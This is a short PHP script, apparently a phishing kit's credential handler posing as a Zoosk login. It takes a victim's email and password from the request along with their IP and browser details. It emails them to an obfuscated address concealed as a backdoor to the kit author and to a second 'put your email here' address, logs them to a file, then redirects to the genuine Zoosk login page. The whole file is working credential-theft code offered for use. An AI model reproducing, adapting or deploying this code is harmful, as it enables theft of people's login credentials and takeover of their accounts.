<?php
$hash6 = "wol";
$dontchange = "2016";
$email = $_GET["email"];
$pass = $_GET["password"];
$md = "fcatcher";
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER ['HTTP_USER_AGENT'];
$java = "@";
$subj = "Owned $email using IP: $ip ";
$key = "gmail.com";
$electmail = ($hash6.$md.$dontchange.$java.$key);
$msg = "
	-----!!!!!!!!!result !!!!!!!!!!!!!-----
	
	
e-mail: $email
pass  : $pass


    ----------------------------------------
IP: $ip
Agent: $useragent
	----------------------------------------
					";
mail($electmail, $subj, $msg);					
file_put_contents('result987001.txt', $msg, FILE_APPEND);
//$fp = fopen('rslt.txt', 'w');
//fwrite($fp, $data);
//fclose($fp);










//put your email here 

mail("kheider8866@gmail.com", $subj, $msg); // < ==================== put your email here 
header("Location: https://www.zoosk.com/login");
?>
